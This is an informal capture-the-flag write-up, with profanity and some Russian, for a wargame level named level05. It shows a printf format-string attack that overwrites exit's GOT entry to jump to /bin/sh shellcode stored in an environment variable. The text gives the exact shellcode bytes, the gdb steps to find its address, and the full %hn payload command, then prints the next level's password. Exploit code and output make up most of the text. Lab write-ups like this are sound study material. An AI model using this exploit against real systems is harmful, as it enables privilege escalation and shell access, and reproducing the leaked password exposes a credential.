info functions дает нам такой рассклад:
0x08048340  printf
0x08048350  fgets
0x08048370  exit
0x08048420  frame_dummy
0x08048444  main


so we need shellcode coz this shit aint using no syscall with bin sh
we have printf which can be fucked with and we have exit after printf, whose *jmp addr we can reroute to shellcode addr

disas exit gives this addr: 
jmp    *0x80497e0

buff addr (???)
0x080497e8  data_start


so first of all in this shit u cant execute stack, 


https://en.wikipedia.org/wiki/Executable_space_protection

google non executable stack for info, but tldr:

dmesg | grep "Execute Disable"
[    0.000000] NX (Execute Disable) protection: active

https://access.redhat.com/solutions/2936741

meaning we cant do the old good shit


well we still need to put in some shellcode coz still no syscall with bin sh

some googling gets me here:
https://access.redhat.com/solutions/2936741
where i get a fine advice of using env var for injecting shellcode.
see, it's the memory addresses which are being checked for this kind of protection
and env vars addresses are quite different from local stack addresses which allows us to well
OVERRIDE the protection kek

anyway, the general solution is the following:
1. we need to export some shellcode as an env var
2. we need to get its address
3. as we will see further this address will be quite unwritebale with the usual int due to int overflow
4. however, two short ints following each other will be written in memory following one another
which will form the right address

so lets go
1. we need to export the shellcode, however, the program does some xor shit to each symbol in buffer which can alterante the shellcode (byez say its tolower but whateves). we don't want it touched so we need to skip the original buff.

use the old generator (ask maxxon for that) to check the buff size. its a 100.
so we need to add some 100 bytes to shellcode then we take its address.

export PEPEGA=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

check env vars in gdb:

b *main+4
r
x/200s environ

0xffffde70: // the address     "PEPEGA=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22---Type <return> to continue, or q <return> to quit---
0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"


0xffffde70 hex to decimal = 4294958704 // see, that's the int overflow i was talking about

exit addr also should be split to write parts of shellcode addr in approprite mem

currently on my machine the hex-to-dec value for addr is the following (may not work the same?):

0xffff = 65535 // same
0xde70 = 56944 //28894

to that shit we need the following adjustments:
- 8 bytes for ptr
- characters already written


making the digits the following: (56944 - 8) + (65535 - 56944) = 56936 + 8591



for printf - the old boy %n specifier + width

(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56936d%10$hn" + "%8591d%11$hn")'; cat) | ./level05

cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
